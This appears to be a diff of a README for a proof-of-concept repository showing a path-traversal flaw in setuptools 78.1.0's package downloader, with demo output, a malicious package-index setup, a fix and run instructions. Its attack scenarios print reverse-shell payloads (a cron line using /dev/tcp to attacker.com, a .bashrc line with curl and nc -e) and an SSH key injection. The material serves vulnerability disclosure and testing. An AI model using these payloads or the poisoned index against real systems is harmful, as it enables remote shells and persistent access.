@@ -5,13 +5,62 @@
 ## Quick Start
 
 ```bash
-# Run in Docker
+# Full demo with attacker server + victim client (recommended)
+docker compose up --build
+
+# Or standalone single container
 docker build -t setuptools-cve-poc .
 docker run --rm setuptools-cve-poc
+```
 
-# Or locally (requires setuptools 78.1.0)
-pip install setuptools==78.1.0
-python poc_direct_download.py
+## Demo Output
+
+```
+============================================================
+EXECUTING ATTACK: CRON
+============================================================
+
+[VICTIM] Connecting to package index: http://server:8080/simple/
+[VICTIM] egg_info_for_url() extracted: /tmp/demo/etc/cron.d/backdoor
+[VICTIM] os.path.join(tmpdir, name) = /tmp/demo/etc/cron.d/backdoor
+[VICTIM] ^^^ NOTE: tmpdir is IGNORED because name is absolute!
+
+[EXPLOITED] File written to: /tmp/demo/etc/cron.d/backdoor
+
+[FILE CONTENTS]
+----------------------------------------
+# Malicious cron job - reverse shell every minute
+* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+----------------------------------------
+
+============================================================
+ATTACK SUMMARY
+============================================================
+  [EXPLOITED] cron
+  [EXPLOITED] ssh
+  [EXPLOITED] bashrc
+```
+
+## Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                        Docker Network                                │
+│                                                                      │
+│  ┌──────────────────────┐         ┌──────────────────────┐          │
+│  │   ATTACKER SERVER    │         │    VICTIM CLIENT     │          │
+│  │   (malicious-pypi)   │         │   (victim-client)    │          │
+│  │                      │         │                      │          │
+│  │  Serves malicious    │ ──────► │  setuptools 78.1.0   │          │
+│  │  package index with  │         │  fetches packages    │          │
+│  │  encoded absolute    │ ◄────── │  from attacker       │          │
+│  │  paths in URLs       │         │                      │          │
+│  │                      │         │  Files written to:   │          │
+│  │  Port 8080           │         │  /etc/cron.d/        │          │
+│  └──────────────────────┘         │  ~/.ssh/             │          │
+│                                   │  ~/.bashrc           │          │
+│                                   └──────────────────────┘          │
+└─────────────────────────────────────────────────────────────────────┘
 ```
 
 ## Vulnerability Summary
@@ -27,8 +76,6 @@ python poc_direct_download.py
 ## The Bug
 
 ```python
-# setuptools/package_index.py lines 810-825
-
 def _download_url(self, url, tmpdir):
     name, _fragment = egg_info_for_url(url)  # Returns "/etc/passwd" from %2Fetc%2Fpasswd
     if name:
@@ -36,11 +83,87 @@ def _download_url(self, url, tmpdir):
             name = name.replace('..', '.').replace('\\', '_')  # Only sanitizes ".."
 
     filename = os.path.join(tmpdir, name)  # os.path.join ignores tmpdir when name is absolute!
-
     return self._download_vcs(url, filename) or self._download_other(url, filename)
 ```
 
 **Root Cause:** `os.path.join("/tmp/safe", "/etc/passwd")` returns `"/etc/passwd"` - the first argument is ignored when the second is absolute.
+
+## Attack Scenarios
+
+### Scenario 1: Cron Job Installation
+```
+Target:  /etc/cron.d/backdoor
+Payload: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
+Impact:  Reverse shell every minute
+```
+
+### Scenario 2: SSH Key Injection
+```
+Target:  ~/.ssh/authorized_keys
+Payload: ssh-rsa AAAAB3... attacker@evil.com
+Impact:  Persistent SSH access without password
+```
+
+### Scenario 3: Shell Profile Backdoor
+```
+Target:  ~/.bashrc
+Payload: curl http://attacker/beacon; nc -e /bin/bash attacker 4444 &
+Impact:  Code execution on every new shell
+```
+
+## Files
+
+```
+├── docker-compose.yml          # Two-container attack demo
+├── server/
+│   ├── Dockerfile              # Attacker's malicious PyPI server
+│   └── malicious_server.py     # Serves poisoned package links
+├── client/
+│   ├── Dockerfile              # Victim with vulnerable setuptools
+│   └── victim_client.py        # Demonstrates exploitation
+├── Dockerfile                  # Standalone single-container demo
+├── demo_scenarios.py           # All three scenarios in one script
+├── poc_direct_download.py      # Simplest PoC
+├── poc_path_traversal.py       # Basic PoC with server
+├── poc_realistic_attack.py     # Simulated attack
+├── poc_full_easy_install.py    # Full attack chain
+├── test_path_traversal_security.py  # 45 security tests
+├── RESEARCH.md                 # Deep technical analysis
+└── README.md
+```
+
+## Running the Demo
+
+### Option 1: Docker Compose (Recommended)
+
+```bash
+# Start both containers
+docker compose up --build
+
+# View server logs only
+docker compose logs server
+
+# Run specific scenario
+docker compose run client python -c "
+from victim_client import run_attack
+run_attack('server', 8080, 'ssh')
+"
+```
+
+### Option 2: Standalone Container
+
+```bash
+docker build -t setuptools-cve-poc .
+docker run --rm setuptools-cve-poc
+```
+
+### Option 3: Local Python
+
+```bash
+pip install setuptools==78.1.0
+python poc_direct_download.py
+python demo_scenarios.py
+```
 
 ## Attack Flow
 
@@ -53,93 +176,12 @@ http://evil/%2Fetc%2Fcron.d%2Fjob  →  /etc/cron.d/job         →  /etc/cron.d
             decoded by egg_info_for_url()
 ```
 
-## Proof of Concept
-
-```
-$ python poc_direct_download.py
-
-=================================================================
-DIRECT PROOF: _download_url() path traversal vulnerability
-=================================================================
-
-[1] Malicious URL: http://127.0.0.1:35737/pkg/%2Ftmp%2FCVE_PROOF.txt
-    Last component: %2Ftmp%2FCVE_PROOF.txt
-
-[2] egg_info_for_url() extracts: '/tmp/CVE_PROOF.txt'
-
-[3] Intended download dir: /tmp/tmp1uygg9cz
-    os.path.join(tmpdir, name) = '/tmp/CVE_PROOF.txt'
-    ^^^ tmpdir is IGNORED because name is absolute!
-
-[4] Calling PackageIndex()._download_url(url, tmpdir)...
-    Returned: /tmp/CVE_PROOF.txt
-
-[5] Checking /tmp/CVE_PROOF.txt...
-
-=================================================================
-VULNERABILITY CONFIRMED!
-=================================================================
-File written to: /tmp/CVE_PROOF.txt
-```
-
-## Files
-
-| File | Description |
-|------|-------------|
-| [RESEARCH.md](RESEARCH.md) | **Deep dive technical analysis** |
-| [poc_direct_download.py](poc_direct_download.py) | Simplest PoC - direct function call |
-| [poc_path_traversal.py](poc_path_traversal.py) | Basic PoC with HTTP server |
-| [poc_realistic_attack.py](poc_realistic_attack.py) | Simulated malicious package index |
-| [poc_full_easy_install.py](poc_full_easy_install.py) | Full easy_install attack chain |
-| [malicious_index_server.py](malicious_index_server.py) | Standalone malicious PyPI server |
-| [test_path_traversal_security.py](test_path_traversal_security.py) | 45 security test cases |
-| [Dockerfile](Dockerfile) | Containerized PoC |
-
-## Attack Scenarios
-
-### 1. Compromised Private Package Index (Most Likely)
-
-```bash
-# Enterprise pip.conf
-[global]
-index-url = https://pypi.internal.company.com/simple/
-
-# Attacker compromises internal index, serves:
-# <a href="/%2Fetc%2Fcron.d%2Fbackdoor">requests-2.28.0.tar.gz</a>
-
-# Developer updates packages:
-pip install --upgrade requests
-# Result: /etc/cron.d/backdoor written with attacker payload
-```
-
-### 2. Dependency Confusion with Legacy Tools
-
-```bash
-# Attacker registers "internal-company-lib" on public PyPI
-# Package metadata contains malicious URLs
-
-# Victim's legacy build system:
-easy_install internal-company-lib
-# Result: Arbitrary file written via path traversal
-```
-
-## Impact
-
-An attacker can write files to any location writable by the user:
-
-| Target | Impact |
-|--------|--------|
-| `/etc/cron.d/backdoor` | Scheduled reverse shell |
-| `~/.ssh/authorized_keys` | SSH access |
-| `~/.bashrc` | Code execution on login |
-| `/var/www/html/shell.php` | Web shell |
-
 ## Affected Code Path
 
 ```
 PackageIndex._download_url()     ← Vulnerable function
     │
-    ├── egg_info_for_url()       ← Extracts & decodes filename
+    ├── egg_info_for_url()       ← Extracts & URL-decodes filename
     │
     ├── while '..' in name       ← Only sanitizes "..", not absolute paths
     │
@@ -176,18 +218,6 @@ def _download_url(self, url, tmpdir):
         raise DistutilsError(f"Path escapes download directory: {filename}")
 
     return self._download_vcs(url, filename) or self._download_other(url, filename)
-```
-
-## Test Results
-
-```
-$ python -m pytest test_path_traversal_security.py -v
-
-=================== 40 passed, 4 skipped, 1 xfailed ===================
-
-- 40 passed: Document current vulnerable behavior
-- 4 skipped: Windows-specific tests (on Linux)
-- 1 xfailed: Will pass once vulnerability is fixed
 ```
 
 ## Related Work
